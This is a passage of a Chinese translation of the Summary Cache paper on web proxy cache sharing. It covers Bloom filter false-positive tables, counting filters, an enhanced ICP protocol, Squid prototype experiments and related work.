组合下的误判率。</p><table><thead><tr><th align="center">m&#x2F;n</th><th align="center">k</th><th align="center">k&#x3D;9</th><th align="center">k&#x3D;10</th><th align="center">k&#x3D;11</th><th align="center">k&#x3D;12</th><th align="center">k&#x3D;13</th><th align="center">k&#x3D;14</th><th align="center">k&#x3D;15</th><th align="center">k&#x3D;16</th></tr></thead><tbody><tr><td align="center">11</td><td align="center">7.62</td><td align="center">0.00531</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">12</td><td align="center">8.32</td><td align="center">0.00317</td><td align="center">0.00334</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">13</td><td align="center">9.01</td><td align="center">0.00194</td><td align="center">0.00198</td><td align="center">0.0021</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">14</td><td align="center">9.7</td><td align="center">0.00121</td><td align="center">0.0012</td><td align="center">0.00124</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">15</td><td align="center">10.4</td><td align="center">0.000775</td><td align="center">0.000744</td><td align="center">0.000747</td><td align="center">0.000778</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">16</td><td align="center">11.1</td><td align="center">0.000505</td><td align="center">0.00047</td><td align="center">0.000459</td><td align="center">0.000466</td><td align="center">0.000488</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">17</td><td align="center">11.8</td><td align="center">0.000335</td><td align="center">0.000302</td><td align="center">0.000287</td><td align="center">0.000284</td><td align="center">0.000291</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">18</td><td align="center">12.5</td><td align="center">0.000226</td><td align="center">0.000198</td><td align="center">0.000183</td><td align="center">0.000176</td><td align="center">0.000176</td><td align="center">0.000182</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">19</td><td align="center">13.2</td><td align="center">0.000155</td><td align="center">0.000132</td><td align="center">0.000118</td><td align="center">0.000111</td><td align="center">0.000109</td><td align="center">0.00011</td><td align="center">0.000114</td><td align="center"></td></tr><tr><td align="center">20</td><td align="center">13.9</td><td align="center">0.000108</td><td align="center">8.89e-05</td><td align="center">7.77e-05</td><td align="center">7.12e-05</td><td align="center">6.79e-05</td><td align="center">6.71e-05</td><td align="center">6.84e-05</td><td align="center"></td></tr><tr><td align="center">21</td><td align="center">14.6</td><td align="center">7.59e-05</td><td align="center">6.09e-05</td><td align="center">5.18e-05</td><td align="center">4.63e-05</td><td align="center">4.31e-05</td><td align="center">4.17e-05</td><td align="center">4.16e-05</td><td align="center">4.27e-05</td></tr><tr><td align="center">22</td><td align="center">15.2</td><td align="center">5.42e-05</td><td align="center">4.23e-05</td><td align="center">3.5e-05</td><td align="center">3.05e-05</td><td align="center">2.78e-05</td><td align="center">2.63e-05</td><td align="center">2.57e-05</td><td align="center">2.59e-05</td></tr><tr><td align="center">23</td><td align="center">15.9</td><td align="center">3.92e-05</td><td align="center">2.97e-05</td><td align="center">2.4e-05</td><td align="center">2.04e-05</td><td align="center">1.81e-05</td><td align="center">1.68e-05</td><td align="center">1.61e-05</td><td align="center">1.59e-05</td></tr><tr><td align="center">24</td><td align="center">16.6</td><td align="center">2.86e-05</td><td align="center">2.11e-05</td><td align="center">1.66e-05</td><td align="center">1.38e-05</td><td align="center">1.2e-05</td><td align="center">1.08e-05</td><td align="center">1.02e-05</td><td align="center">9.87e-06</td></tr><tr><td align="center">25</td><td align="center">17.3</td><td align="center">2.11e-05</td><td align="center">1.52e-05</td><td align="center">1.16e-05</td><td align="center">9.42e-06</td><td align="center">8.01e-06</td><td align="center">7.1e-06</td><td align="center">6.54e-06</td><td align="center">6.22e-06</td></tr><tr><td align="center">26</td><td align="center">18</td><td align="center">1.57e-05</td><td align="center">1.1e-05</td><td align="center">8.23e-06</td><td align="center">6.52e-06</td><td align="center">5.42e-06</td><td align="center">4.7e-06</td><td align="center">4.24e-06</td><td align="center">3.96e-06</td></tr><tr><td align="center">27</td><td align="center">18.7</td><td align="center">1.18e-05</td><td align="center">8.07e-06</td><td align="center">5.89e-06</td><td align="center">4.56e-06</td><td align="center">3.7e-06</td><td align="center">3.15e-06</td><td align="center">2.79e-06</td><td align="center">2.55e-06</td></tr><tr><td align="center">28</td><td align="center">19.4</td><td align="center">8.96e-06</td><td align="center">5.97e-06</td><td align="center">4.25e-06</td><td align="center">3.22e-06</td><td align="center">2.56e-06</td><td align="center">2.13e-06</td><td align="center">1.85e-06</td><td align="center">1.66e-06</td></tr><tr><td align="center">29</td><td align="center">20.1</td><td align="center">6.85e-06</td><td align="center">4.45e-06</td><td align="center">3.1e-06</td><td align="center">2.29e-06</td><td align="center">1.79e-06</td><td align="center">1.46e-06</td><td align="center">1.24e-06</td><td align="center">1.09e-06</td></tr><tr><td align="center">30</td><td align="center">20.8</td><td align="center">5.28e-06</td><td align="center">3.35e-06</td><td align="center">2.28e-06</td><td align="center">1.65e-06</td><td align="center">1.26e-06</td><td align="center">1.01e-06</td><td align="center">8.39e-06</td><td align="center">7.26e-06</td></tr><tr><td align="center">31</td><td align="center">21.5</td><td align="center">4.1e-06</td><td align="center">2.54e-06</td><td align="center">1.69e-06</td><td align="center">1.2e-06</td><td align="center">8.93e-07</td><td align="center">7e-07</td><td align="center">5.73e-07</td><td align="center">4.87e-07</td></tr><tr><td align="center">32</td><td align="center">22.2</td><td align="center">3.2e-06</td><td align="center">1.94e-06</td><td align="center">1.26e-06</td><td align="center">8.74e-07</td><td align="center">6.4e-07</td><td align="center">4.92e-07</td><td align="center">3.95e-07</td><td align="center">3.3e-07</td></tr></tbody></table><p><strong>表5：</strong> 在各种 m&#x2F;n 和 $k$ 组合下的误判率。</p><table><thead><tr><th align="center">m&#x2F;n</th><th align="center">k</th><th align="center">k&#x3D;17</th><th align="center">k&#x3D;18</th><th align="center">k&#x3D;19</th><th align="center">k&#x3D;20</th><th align="center">k&#x3D;21</th><th align="center">k&#x3D;22</th><th align="center">k&#x3D;23</th><th align="center">k&#x3D;24</th></tr></thead><tbody><tr><td align="center">22</td><td align="center">15.2</td><td align="center">2.67e-05</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">23</td><td align="center">15.9</td><td align="center">1.61e-05</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">24</td><td align="center">16.6</td><td align="center">9.84e-06</td><td align="center">1e-05</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">25</td><td align="center">17.3</td><td align="center">6.08e-06</td><td align="center">6.11e-06</td><td align="center">6.27e-06</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">26</td><td align="center">18</td><td align="center">3.81e-06</td><td align="center">3.76e-06</td><td align="center">3.8e-06</td><td align="center">3.92e-06</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">27</td><td align="center">18.7</td><td align="center">2.41e-06</td><td align="center">2.34e-06</td><td align="center">2.33e-06</td><td align="center">2.37e-06</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">28</td><td align="center">19.4</td><td align="center">1.54e-06</td><td align="center">1.47e-06</td><td align="center">1.44e-06</td><td align="center">1.44e-06</td><td align="center">1.48e-06</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">29</td><td align="center">20.1</td><td align="center">9.96e-07</td><td align="center">9.35e-07</td><td align="center">9.01e-07</td><td align="center">8.89e-07</td><td align="center">8.96e-07</td><td align="center">9.21e-07</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">30</td><td align="center">20.8</td><td align="center">6.5e-07</td><td align="center">6e-07</td><td align="center">5.69e-07</td><td align="center">5.54e-07</td><td align="center">5.5e-07</td><td align="center">5.58e-07</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">31</td><td align="center">21.5</td><td align="center">4.29e-07</td><td align="center">3.89e-07</td><td align="center">3.63e-07</td><td align="center">3.48e-07</td><td align="center">3.41e-07</td><td align="center">3.41e-07</td><td align="center">3.48e-07</td><td align="center"></td></tr><tr><td align="center">32</td><td align="center">22.2</td><td align="center">2.85e-07</td><td align="center">2.55e-07</td><td align="center">2.34e-07</td><td align="center">2.21e-07</td><td align="center">2.13e-07</td><td align="center">2.1e-07</td><td align="center">2.12e-07</td><td align="center">2.17e-07</td></tr></tbody></table><p><strong>图4</strong> 中的曲线图显示了误判率与分配给每个条目的位数的关系，即比率为：  $\alpha &#x3D; n &#x2F; m $ 。上面的曲线是针对 4个哈希函数的情况。下面的曲线是散列函数的最佳数量。标度是对数的，因此观察到的直线对应于指数下降。显然，由于布隆过滤器中每个Key只有很少的存储空间，因此存在一些误报的轻微风险。例如，对于一个比Key数量大10倍的位数组，在使用4个散列函数的情况下，误报率大概为1.2％，使用5个散列函数的情况下，误报的概率为0.9％。 我们也可以通过分配更多的内存来轻松降低误报率。</p><p><img src="/assets/images/summary-cache-figure-4.png" alt="图4：假阳性的概率（对数刻度）。顶部曲线用于4个哈希函数。 底部曲线是散列函数的最佳（整数）个数" loading="lazy"></p><p>由于在我们的上下文中，每个代理都维护一个本地布隆过滤器来存储自己的缓存文档，因此集合 $A$ 必须支持修改。这是通过为位数组中的每个位置 $\tau$ 维持该位被设置为 $1$ 的次数 $c(\tau)$（即散列值为 $\tau$ 的元素的数量）的计数来完成的。所有的计数最初都为0。当我们插入或者删除键 $a$ （在我们示例的文档中为URL）的时候，计数 $c(h_1(a),h_2(a),…h_k(a))$ 相应的增加或者减少。当计数从0变为1的时候，相应的位被打开，当计数从1变为0的时候，相应的位将关闭，因此，本地的布隆过滤器始终正确反应当前目录。</p><p>由于我们还需要为计数分配内存，因此重要的是要知道它们可以变为多大。 将具有 $k$ 个散列函数的 $n$ 个密钥插入大小为 $m$ 的位数组后，估计预期最大计数为（参见[22，第72页]）</p><p>$T^{-1}{(m)}(1 + \displaystyle \frac{ln(kn&#x2F;m)}{ln T^{-1}(m)} + O(\frac{1}{ln^2 T^{-1}(m)}))$</p><p>并且任何计数大于或等于 $i$ 的概率为：</p><p>$Pr(max(c) \geq i) \leq m({^{nk}_i}){ \displaystyle \frac{1}{m^i}} \leq m({\displaystyle \frac{enk}{im}})^i$</p><p>如前所述，$k$（超过实数）的最优值为 $ln(2m&#x2F;n)$，因此假设哈希函数的数量小于 $ln(2m&#x2F;n)$ ，我们可以进一步限制：</p><p>$Pr(max(c) \geq i) \leq m({\displaystyle \frac{eln2}{i}})^i$</p><p>因此，取 $i &#x3D; 16$，我们得到：</p><p>$Pr(max(c) \geq 16) \leq 1.37 * 10^{-15} * m$</p><p>换句话说，如果我们允许使用4个比特位用于计数，则在表的初始插入过程中，实际 $m$ 值的溢出概率很小。</p><p>在实践中，我们必须考虑到哈希函数并不是真正随机的，并且我们一直在进行插入和删除操作。 不过，<strong>似乎每个计数占用4个比特位就足够了</strong>。 此外，如果计数超过 <code>15</code>，我们可以简单地将其保持在<code>15</code>；否则，它将保持不变。 在多次删除之后，这可能会导致布隆过滤器允许出现假负数（当计数不应为<code>0</code>时该计数变为<code>0</code>）的情况，但是发生此类事件的可能性非常低，以至于同时将重新启动代理服务器，并重建整个结构。</p><h3 id="布隆过滤器作为摘要"><a href="#布隆过滤器作为摘要" class="headerlink" title="布隆过滤器作为摘要"></a>布隆过滤器作为摘要</h3><p><img src="/assets/images/summary-cache-figure-5.png" alt="图5：不同摘要表示形式下的总点击率" loading="lazy"></p><p><img src="/assets/images/summary-cache-figure-6.png" alt="图6：不同摘要表示下的错误命中率。 请注意，y轴为对数刻度" loading="lazy"></p><p><img src="/assets/images/summary-cache-figure-7.png" alt="图7： 不同摘要形式下每个用户请求的网络消息数。 请注意，y轴为对数刻度" loading="lazy"></p><p><img src="/assets/images/summary-cache-figure-8.png" alt="图8： 不同摘要格式下每个用户请求的网络消息字节数" loading="lazy"></p><p><img src="/assets/images/summary-cache-figure-9.png" alt="图9： 不同摘要表示形式的内存需求" loading="lazy"></p><p>布隆过滤器提供了一种创建摘要信息的简单机制。代理从缓存文档的URL列表构建Bloom过滤器，然后将位数组以及哈希函数的规范发送给其他代理。 更新摘要信息时，代理可以指定翻转位数组中的哪些位，或发送整个数组，以较小者为准。</p><p>每个代理都维护着布隆过滤器的本地副本，并在将文档添加到缓存或从缓存中替换文档时对其进行更新。正如以上所说明的，为了更新本地的布隆过滤器，代理服务器需要维护一个计数器数组，每个计数器记住相应位设置为1的次数。并将文档添加到高速缓存中时，增加相应位的计数器； 当从缓存中删除它时，减少相应位的计数器。 当计数器从0增加到1或从1下降到0时，相应的位应该分别被设置为1或0，并在列表中添加一条记录更新的记录。</p><p>布隆过滤器的优点是，它们可以在内存需求和误报率（会导致误判命中）之间进行权衡。 因此，代理可以在代理间的通信量略有增加的情况下，为摘要信息分配较少的内存。</p><p>我们针对基于布隆过滤器的摘要信息尝试了三种配置：<strong>位数组的大小为缓存中平均文档数的8倍，16倍和32倍（该比率也称为 “加载因子”）</strong>。 通过将高速缓存大小除以<strong>8K</strong>（平均文档大小）来计算平均文档数。 所有这三种配置都使用<strong>四个哈希函数</strong>。 哈希函数的数量并不是每种配置的最佳选择，但足以证明布隆过滤器的性能。 首先通过计算URL的MD5签名[38]（产生128位），然后<strong>将128位划分为4个32位字</strong>，最后将每个32位字的模数与表大小 $m$ 进行比较。MD5是一种加密消息摘要算法，可将任意长度的字符串散列为128位[38]。我们选择它是因为其众所周知的属性和相对较快的实现。</p><p>这些摘要信息表示，<strong>精确目录方法</strong>和<strong>服务器名称方法的性能</strong>如<strong>图5</strong>到<strong>图9</strong>所示。在<strong>图5</strong>中，我们显示了<strong>总的高速缓存命中率</strong>，在<strong>图6</strong>中，我们显示了<strong>错误命中率</strong>。 请注意，<strong>图6</strong>中的y轴为对数刻度。 <strong>基于布隆过滤器的摘要实际上具有与精确目录方法相同的缓存命中率，并且在位数组较小时具有较高的假命中率</strong>。 服务器名称具有较高的错误命中率。 它具有较高的缓存命中率，可能是因为它的许多错误命中有助于避免错误遗漏。</p><p><strong>图7</strong>显示了代理间网络消息的总数，包括<strong>摘要更新的数量和查询消息的数量（包括远程高速缓存命中，错误命中和远程陈旧命中）</strong>。注意，<strong>图7</strong>中的y轴为对数刻度。为了进行比较，我们还列出了每个跟踪中<code>ICP</code>引起的消息数。假定所有消息都是单播消息。该图通过每个跟踪中的HTTP请求数将消息数标准化。基于精确目录和布隆过滤器的摘要都可以很好地执行，并且服务器名和<code>ICP</code>会生成更多消息。对于布隆过滤器，如预期的那样，需要在位阵列大小和消息数之间进行权衡。但是，一旦错误命中率足够小，错误命中就不再是代理间消息的主要来源。而是，远程缓存命中和远程陈旧命中成为主导。因此，在<code>负载因数16</code>和<code>负载因数32</code>之间在网络消息方面的差异很小。与<code>ICP</code>相比，基于布隆过滤器的摘要将消息数量减少了<code>25</code>到<code>60</code>。</p><p><strong>图8</strong>显示了代理间网络消息的估计总大小（以字节为单位）。我们估计大小是因为更新消息往往大于查询消息。<code>ICP</code>和其他方法中查询消息的平均大小均假定为<code>标头20字节</code>和<code>平均URL为50字节</code>。 精确目录和服务器名称中摘要更新的大小假定为<code>标头20字节</code>，<code>每次更改16字节</code>。 在基于布隆过滤器的摘要中，摘要更新的大小估计为32字节的标头（请参见第6节）加上每个位翻转4字节。 结果表明，<strong>就消息字节而言，基于布隆过滤器的摘要比ICP改善了55％至64％</strong>。 换句话说，摘要缓存偶尔使用大消息突发，以避免连续发送小消息。 查看<strong>表2、6和7</strong>中的CPU开销和网络接口数据包（其中SC-ICP代表摘要缓存方法），我们可以看到这是一个很好的权衡。</p><p>最后，<strong>图9</strong>显示了摘要缓存方法的每个代理的内存，以缓存大小的百分比表示。 三种布隆过滤器配置所消耗的内存比精确目录少得多，但在所有其他方面的性能却与精确目录类似。 负载因数为8时，布隆过滤器摘要与服务器名称方法具有相似或更少的内存要求，并且错误命中率和网络消息更少。 由于<code>DEC</code>，<code>UCB</code>，<code>UPisa</code>，<code>NLANR</code>和<code>Questnet</code>迹线<code>分别具有16、8、8、4和12个代理</code>，因此该图表明内存需求随代理的数量线性增长。</p><p>考虑所有结果，我们看到布隆过滤器的摘要在低网络开销和低内存需求方面提供了最佳性能。 这种方法简单易行。 除MD5之外，其他更快的哈希方法也可用，例如哈希函数可以基于Rabin指纹方法（参见[42]，[7]）中的多项式算法或简单的哈希函数（例如[22]，p. [48]）可用于生成例如32位，并且可以通过对这32位（视为整数）进行随机线性变换来获得其他位。 缺点是这些较快的功能是有效可逆的（也就是说，可以轻松地构建散列到特定位置的URL），这一事实可能被恶意用户用于邪恶目的。</p><h3 id="推荐配置"><a href="#推荐配置" class="headerlink" title="推荐配置"></a>推荐配置</h3><p>结合以上结果，我们建议对摘要缓存方法进行以下配置。<strong>更新阈值应在1％到10％之间，以避免显着降低总缓存命中率</strong>。如果<strong>选择了基于时间的更新方法，则应选择时间间隔，以使新文档的百分比在1％到10％之间</strong>。代理可以广播更改（如果较小，则广播整个位数组），或者让其他代理从中获取更新。摘要应采用布隆过滤器的形式。<strong>8到16之间的负载系数可以很好地工作，但是代理可以根据其内存和网络流量问题降低或提高它</strong>。<strong>基于负载因子，应使用四个或更多哈希函数</strong>。此处和[16]中提供的数据可以用作决策参考。<strong>对于散列函数，我们建议从URL的128位MD5签名中获取不相交的位组</strong>。如果需要更多位，则可以计算与其自身连接的URL的MD5签名。实际上，与缓存文档所引起的用户和系统CPU开销相比，MD5的计算开销可以忽略不计（请参阅第[7]节）。</p><h3 id="可扩展性"><a href="#可扩展性" class="headerlink" title="可扩展性"></a>可扩展性</h3><p>尽管我们的模拟是针对<code>4</code>到<code>16</code>个代理完成的，但是我们可以轻松地推断出结果。例如，假设每个代理有<code>8GB的缓存</code>要合作。每个代理平均存储约<code>100万个网页</code>。表示<code>1M页面</code>所需的布隆过滤器内存在<code>负载因子16时为2MB</code>。每个代理大约需要<code>200MB</code>来表示所有摘要，另外需要<code>1MB</code>来表示自己的计数器。代理间消息包括更新消息，错误命中，远程缓存命中和远程陈旧命中。 <strong>1％的阈值对应于更新之间的10K请求，每个更新包含99条消息，每个请求的更新消息数小于0.01</strong>。<strong>带有10个哈希函数的16的负载因子的假命中率约为4.7％（每个摘要的误报率小于0.00047，但其中有100个摘要）</strong>。因此，不计算远程缓存命中和远程陈旧命中（在代理数量上相对稳定）引入的消息，协议引入的开销是每个请求100个代理的0.06条消息以下。在这些消息中，只有更新消息很大，大约数百KB。幸运的是，更新消息可以通过不可靠的多播方案进行传输。我们的仿真预测，在保持较低开销的同时，与ICP的理论命中率相比，该方案将总命中率降低了不到2％。</p><p>尽管没有迹线足够大以至于无法对100个代理进行有意义的仿真，但我们已经使用大量代理进行了仿真，结果验证了这些&#96;&#96;封底’’的计算结果。 因此，我们相信摘要缓存可以很好地扩展。</p><h2 id="摘要缓存增强型ICP的实现"><a href="#摘要缓存增强型ICP的实现" class="headerlink" title="摘要缓存增强型ICP的实现"></a>摘要缓存增强型ICP的实现</h2><p>基于仿真结果，我们提出以下摘要缓存增强的Internet缓存协议作为ICP的优化。 该协议已在<code>Squid 1.1.14</code>之上的原型中实现，并且该原型可公开获得[15]。 在<code>Squid 1.2b20</code>中也实现了我们的方法的一种称为<code>Cache Digest的变体</code>[44]。</p><h3 id="协议书"><a href="#协议书" class="headerlink" title="协议书"></a>协议书</h3><p>我们协议的设计面向较小的延迟阈值。 因此，它假定摘要是通过发送差异来更新的。 如果延迟阈值很大，则发送整个位阵列会更经济； <code>Squid 1.2b20</code> [44]中的<code>Cache Digest原型</code>采用了这种方法。</p><p>我们在ICP版本2[48]中添加了新的操作码，<code>ICP_OP_DIRUPDATE（= 20）</code>，代表目录更新消息。 在更新消息中，常规ICP头后面有一个附加头，该头包括：<code>16位的Function_Num</code>，<code>16位的Function_Bits</code>，<code>32位的BitArray_Size_InBits</code>和<code>32位的Number_of_Updates</code>。 标头完全指定用于探测过滤器的哈希函数。 有散列函数的Function_Num。 通过首先从URL的MD5签名[38,22]中取出位0到M-1，M到2M-1、2M到3M-1等来计算函数，其中M是Function_Bits，然后进行模块化 位由BitArray_Size_InBits决定。 如果128位不够用，则通过计算与其自身连接的URL的MD5签名来生成更多位。</p><p>标头后跟一个32位整数列表。 整数中的最高有效位指定该位应设置为<code>0</code>还是<code>1</code>，其余位指定需要更改的位的索引。 该设计是出于以下考虑：如果消息仅指定应翻转的位，则丢失先前的更新消息将具有级联效应。 该设计使消息可以通过不可靠的多播协议发送。 此外，每个更新消息都带有标头，该标头指定哈希函数，以便接收者可以验证信息。 该设计将哈希表的大小限制为小于20亿，这暂时足够大。</p><h3 id="原型实现"><a href="#原型实现" class="headerlink" title="原型实现"></a>原型实现</h3><p>我们修改了<code>Squid 1.1.4</code>软件以实现上述协议。 一个额外的位数组被添加到每个邻居的数据结构中。 当从邻居接收到第一摘要更新消息时，初始化该结构。 代理还分配了一个字节计数器数组来维护Bloom过滤器的本地副本，并分配一个整数数组来记住过滤器的更改。</p><p>由于<code>ICP</code>是基于<code>UDP</code>构建的，因此当前的原型通过UDP发送更新消息。 该设计的一种变体是通过TCP或多播发送消息。 由于这些消息的大小，最好通过<code>TCP</code>或多播发送它们。 此外，由于协作代理的收集是相对静态的，因此代理可以仅保持彼此之间的永久<code>TCP</code>连接以交换更新消息。 不幸的是，在<code>Squid</code>中实现<code>ICP</code>仅在<code>UDP</code>之上。 因此，原型有悖于5.5节中的建议，并且只要有足够的更改来填充IP数据包，就发送更新。 该实现还利用<code>Squid</code>的内置支持来检测邻居代理的故障和恢复，并在故障邻居恢复时重新初始化它。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>表6：实验2中UPisa迹线的ICP和摘要缓存的性能。括号中的数字表示三个实验之间测量值的差异。</p><table><thead><tr><th>Exp</th><th>Hit Ratio</th><th>Client Latency</th><th>User CPU</th><th>System CPU</th><th>UDP Traffic</th><th>TCP Traffic</th><th>Total Packets</th></tr></thead><tbody><tr><td>no ICP</td><td>16.94</td><td>6.22(0.4%)</td><td>81.72(0.1%)</td><td>115.63(0.1%)</td><td>4718(1%)</td><td>242K(0.1%)</td><td>259K(0.1%)</td></tr><tr><td>ICP</td><td>19.3</td><td>6.31(0.5%)</td><td>116.81(0.1%)</td><td>137.12(0.1%)</td><td>72761(0%)</td><td>245K(0.1%)</td><td>325K(0.2%)</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>1.42%</td><td>43%</td><td>19%</td><td>1400%</td><td>1%</td><td>25%</td></tr><tr><td>SC-ICP</td><td>19.0</td><td>6.07 (0.1%)</td><td>91.53(0.4%)</td><td>121.75(0.5%)</td><td>5765(2%)</td><td>244K(0.1%)</td><td>262K(0.1%)</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>-2.4%</td><td>12%</td><td>5%</td><td>22%</td><td>1%</td><td>1%</td></tr></tbody></table><p>表7：实验3中UPisa跟踪的ICP和摘要缓存的性能</p><table><thead><tr><th>Exp</th><th>Hit Ratio</th><th>Client Latency</th><th>User CPU</th><th>System CPU</th><th>UDP Traffic</th><th>TCP Traffic</th><th>Total Packets</th></tr></thead><tbody><tr><td>no ICP</td><td>9.94</td><td>7.11</td><td>81.75</td><td>119.7</td><td>1608</td><td>248K</td><td>265K</td></tr><tr><td>ICP</td><td>17.9</td><td>7.22</td><td>121.5</td><td>146.4</td><td>75226</td><td>257K</td><td>343K</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>1.6%</td><td>49%</td><td>22%</td><td>4577%</td><td>3.7%</td><td>29%</td></tr><tr><td>SC-ICP</td><td>16.2</td><td>6.80</td><td>90.4</td><td>126.5</td><td>4144</td><td>254K</td><td>274K</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>-4.3%</td><td>11%</td><td>5.7%</td><td>1.6</td><td>2.4%</td><td>3.2%</td></tr></tbody></table><p>我们对该原型进行了三个实验。 第一个实验重复第4节中的测试，结果包含在第4节<strong>表2</strong>中，标题为<code>SC-ICP</code>。改进的协议将UDP流量减少了50倍，并且具有网络流量， CPU时间和客户端等待时间与No-ICP相似。</p><p>我们的第二个实验和第三个实验重播了UPisa跟踪中的前24,000个请求。我们使用在4个工作站上运行的80个客户端进程的集合，并将同一工作站上的客户端进程连接到同一代理服务器。在第二个实验中，我们通过让每个客户端进程通过发出它们的Web请求来模拟一组真实的客户端来重播跟踪。在第三个实验中，我们通过让客户端进程从跟踪文件循环发出请求来重播跟踪，而不管每个请求来自哪个实际客户端。第二个实验保留了客户端及其请求之间的边界，并且客户端的请求都转到同一个代理。但是，它不会保留来自不同客户端的请求之间的顺序。第三个实验不保留请求和客户端之间的边界，但是保留请求之间的时序顺序。与第二个实验相比，第三个实验中的代理负载均衡性更高。</p><p>在这两个实验中，每个请求的URL都在跟踪文件中包含请求的大小，并且服务器以指定的字节数进行答复。 其余配置与第4节中的实验相似。与综合基准不同，该跟踪包含大量的远程命中。 实验2的结果列在表6中，实验3的结果列在<strong>表7</strong>中。</p><p>结果表明，增强的ICP协议可显着减少网络流量和CPU开销，而仅略微降低总命中率。 与No-ICP相比，增强的ICP协议可以稍微降低客户端等待时间，即使它将CPU时间增加了大约12％。 客户端延迟的减少归因于远程缓存命中。 单独的实验表明，大多数CPU时间增加是由于服务于远程命中，而MD5计算导致的CPU时间增加不到5％。 尽管实验没有如实地重播跟踪，但它们确实说明了摘要缓存在实践中的性能。</p><p>我们的结果表明，摘要缓存增强的ICP解决了ICP的开销问题，需要最小的更改，并且可以在广域网上共享可伸缩的Web缓存。</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h2><p>Web缓存是一个活跃的研究领域。 关于Web客户端访问特性[10,3,14,33,23]，Web缓存算法[49,35,8]以及Web缓存一致性[28,31,34,13]已有许多研究。 我们的研究不涉及缓存算法或缓存一致性维护，但是在我们对Web缓存共享的好处进行调查的过程中，与某些客户端流量研究重叠。</p><p>最近，文献中提出了许多新的缓存共享方法。缓存阵列路由协议[46]在一组松散耦合的代理服务器之间划分URL空间，并让每个代理仅缓存URL哈希到其上的文档。该方法的优点在于，它消除了文档的重复副本。但是，尚不清楚该方法在代理分布在区域网络中的广域缓存共享方面的性能如何。 Relais项目[27]还建议使用本地目录在其他缓存中查找文档，并异步更新目录。这个想法类似于摘要缓存。但是，该项目似乎并未解决内存需求问题。从Relais的出版物中我们可以找到并阅读[4]，我们也不清楚该项目是否解决了目录更新频率的问题。由紧密耦合的群集工作站构建的代理也使用各种哈希和分区方法来利用群集中的内存和磁盘[20]，但是这些方法不适用于广域网。</p><p>我们的研究部分受到名为目录服务器[21]的现有提议的推动。 该方法使用中央服务器来跟踪所有代理的缓存目录，并且所有代理向服务器查询其他代理中的缓存命中。 该方法的缺点是中央服务器很容易成为瓶颈。 优点是，除了远程命中之外，同级代理之间几乎不需要通信。</p><p>关于Web缓存层次结构和缓存共享的研究也很多。 分层Web缓存最早是在Harvest项目[26,12]中提出的，该项目还引入了ICP协议。 当前，Squid代理服务器实现了ICP协议的第2版[48]，我们的摘要缓存增强型ICP以此版本为基础。 自适应Web缓存[50]提出了一种基于多播的自适应缓存基础结构，用于在Web中分发文档。 特别地，该方案试图沿着到服务器的路线将文档放置在正确的缓存中。 我们的研究未解决定位问题。 相反，我们注意到我们的研究是互补的，因为摘要缓存方法可以用作传达缓存内容的机制。</p><p>尽管我们没有模拟这种情况，但是可以在父代理和子代理之间使用摘要缓存增强的ICP。 分层Web缓存不仅包括相邻（同级）代理之间的协作，还包括父代和子代代理之间的协作。 同级代理与父级代理之间的区别在于，代理不能要求同级代理从服务器获取文档，而可以要求父级代理这样做。 尽管我们的模拟仅涉及同级代理之间的协作，但是摘要缓存方法可用于将有关父缓存内容的信息传播到子代理，并消除子代理对父代的ICP查询。 我们对Questnet跟踪的检查表明，子级到父级ICP查询可能是父级必须处理的消息的很大一部分（超过2&#x2F;3）。</p><p>在操作系统的上下文中，已经有很多关于协作文件缓存[11,2]和全局存储系统（GMS）[17]的研究。这些系统中的基本假设是高速局域网比磁盘快，并且工作站应使用彼此的空闲内存来缓存文件页面或虚拟内存页面，以避免流向磁盘。在这方面，问题与Web缓存共享完全不同。另一方面，在这两种情况下，都存在缓存应紧密协作的问题。大多数协作文件缓存和GMS系统都试图模拟全局LRU替换算法，有时还会使用提示[45]。有趣的是，对于是否需要全局替换算法，我们得出了截然不同的结论[17]。原因是在OS上下文中，全局替换算法用于从空闲工作站窃取内存（即负载均衡缓存），而在Web缓存共享中，每个代理一直都在忙。因此，尽管简单的缓存共享在OS上下文中的性能较差，但只要每个代理的资源配置都适合其负载，就足以满足Web代理缓存共享的需要。最后，请注意，基于Bloom筛选器的摘要缓存技术不限于Web代理缓存上下文，而是可以在其他缓存内容的知识有帮助的情况下使用，例如，在集群中的缓存和负载平衡方面。服务器。</p><h2 id="结论与未来工作"><a href="#结论与未来工作" class="headerlink" title="结论与未来工作"></a>结论与未来工作</h2><p>我们提出了摘要缓存增强的ICP，这是一种可扩展的广域Web缓存共享协议。 使用跟踪驱动的模拟和测量，我们演示了Web代理缓存共享的好处，说明了当前缓存共享协议的开销，并表明摘要缓存方法大大降低了开销。 我们研究了这种方法的两个关键方面：延迟更新的影响以及摘要的简洁表示。 我们的解决方案是基于具有更新延迟阈值的Bloom过滤器的摘要，对内存和带宽的需求较低，但实现了与原始ICP协议相似的命中率。 